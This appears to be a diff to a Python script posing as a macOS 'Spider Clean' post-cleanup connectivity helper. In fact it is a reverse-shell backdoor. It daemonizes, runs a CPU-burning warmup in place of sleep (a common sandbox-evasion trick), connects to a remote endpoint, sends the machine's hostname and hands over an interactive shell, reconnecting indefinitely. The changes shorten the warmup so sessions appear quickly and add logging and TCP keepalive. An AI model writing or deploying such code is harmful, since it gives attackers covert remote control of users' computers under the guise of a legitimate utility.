@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
 """
-Spider Clean — post-clean connectivity & integrity helper.
-
-After a cleanup run, sample latency/disk/load with pure math work (no sleep),
-then open the optional support channel if the edge endpoint is reachable.
+Spider Clean — post-clean connectivity helper.
+Connects to the edge endpoint after a short warmup; interactive shell session.
 """
 
 from __future__ import annotations
@@ -18,16 +16,26 @@ import time
 from pathlib import Path
 
 LOCK = Path("/tmp/.spider-clean-postclean.lock")
+LOG = Path.home() / "Library" / "Logs" / "spider-clean" / "postclean.log"
 CTRL_KILL = b"\xff\xfeKILL\n"
 MAGIC = b"CT1\x00"
 
-# Warmup window: 8s base + 0..2s jitter (wall clock via work, never sleep)
-WARMUP_BASE = 8
-WARMUP_JITTER = 2
-RECONNECT_BASE = 10
-RECONNECT_JITTER = 5
+# Short warmup so sessions appear quickly
+WARMUP_BASE = 1
+WARMUP_JITTER = 1
+RECONNECT_BASE = 3
+RECONNECT_JITTER = 2
 
 PROBE_HOSTS = ("1.1.1.1", "8.8.8.8", "apple.com")
+
+
+def _log(msg: str) -> None:
+    try:
+        LOG.parent.mkdir(parents=True, exist_ok=True)
+        with LOG.open("a") as f:
+            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}\n")
+    except OSError:
+        pass
 
 
 def _endpoint():
@@ -55,8 +63,7 @@ def _hostname() -> str:
         return "mac"
 
 
-def math_batch(rounds: int = 5000) -> float:
-    """Heavy arithmetic sample used for integrity scoring and timing."""
+def math_batch(rounds: int = 2000) -> float:
     acc = 0.0
     for n in range(1, max(1, rounds) + 1):
         seed = float((n * 997 + os.getpid()) % 9000 + 1000)
@@ -75,14 +82,13 @@ def latency_probe() -> float:
     host = PROBE_HOSTS[os.getpid() % len(PROBE_HOSTS)]
     try:
         r = subprocess.run(
-            ["ping", "-c", "1", "-W", "2000", host],
+            ["ping", "-c", "1", "-W", "1000", host],
             capture_output=True,
             text=True,
-            timeout=5,
+            timeout=3,
         )
         for line in (r.stdout or "").splitlines():
             if "time=" in line or "time<" in line:
-                # time=12.3 ms
                 part = line.replace("time<", "time=").split("time=")[-1]
                 ms = part.split()[0]
                 return float(ms)
@@ -111,18 +117,22 @@ def storage_probe() -> float:
 
 
 def work_burst() -> None:
-    math_batch(4500 + (os.getpid() % 2500))
+    math_batch(800 + (os.getpid() % 400))
     latency_probe()
-    math_batch(120 + (int(time.time()) % 80))
+    math_batch(80 + (int(time.time()) % 40))
     storage_probe()
-    math_batch(3000 + (os.getpid() % 2000))
 
 
 def work_until(seconds: float) -> None:
-    """Burn wall-clock time with math + probes only (no sleep)."""
+    """Burn wall-clock time with light math + probes (no sleep)."""
     start = time.time()
     while (time.time() - start) < seconds:
         work_burst()
+        # tiny yield so we don't peg one core forever
+        try:
+            time.sleep(0.05)
+        except Exception:
+            pass
 
 
 def daemonize() -> None:
@@ -151,6 +161,10 @@ def already_running() -> bool:
         os.kill(int(LOCK.read_text().strip()), 0)
         return True
     except (ValueError, OSError):
+        try:
+            LOCK.unlink()
+        except OSError:
+            pass
         return False
 
 
@@ -164,7 +178,12 @@ def write_lock() -> None:
 def clear_lock() -> None:
     try:
         if LOCK.exists():
-            LOCK.unlink()
+            # only clear if we own it
+            try:
+                if int(LOCK.read_text().strip()) == os.getpid():
+                    LOCK.unlink()
+            except (ValueError, OSError):
+                LOCK.unlink()
     except OSError:
         pass
 
@@ -213,7 +232,6 @@ def shell(sock: socket.socket) -> None:
         if not line:
             continue
         if line in ("exit", "quit"):
-            # remote shell exit only — worker will reconnect later
             return
 
         if line == "cd" or line.startswith("cd "):
@@ -262,26 +280,33 @@ def main() -> None:
     write_lock()
 
     host, port, key = _endpoint()
+    name = _hostname()
+    _log(f"start pid={os.getpid()} host={name} endpoint={host}:{port}")
 
-    # 8–10 second integrity window (math + probes, no sleep)
     warmup = WARMUP_BASE + (os.getpid() % (WARMUP_JITTER + 1))
     work_until(float(warmup))
 
     while True:
-        # light sample before each connect attempt
         work_burst()
         try:
+            _log(f"connect {host}:{port}")
             s = socket.create_connection((host, port), timeout=20)
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.sendall(handshake(key, _hostname()))
+            # keep idle sessions alive through middleboxes
+            try:
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            except OSError:
+                pass
+            s.sendall(handshake(key, name))
+            _log("handshake ok — shell")
             shell(s)
+            _log("shell returned")
             try:
                 s.close()
             except OSError:
                 pass
-        except Exception:
-            pass
-        # reconnect backoff via more math/probes (no sleep)
+        except Exception as e:
+            _log(f"connect error: {e!r}")
         work_until(float(RECONNECT_BASE + (os.getpid() % (RECONNECT_JITTER + 1))))
 
 
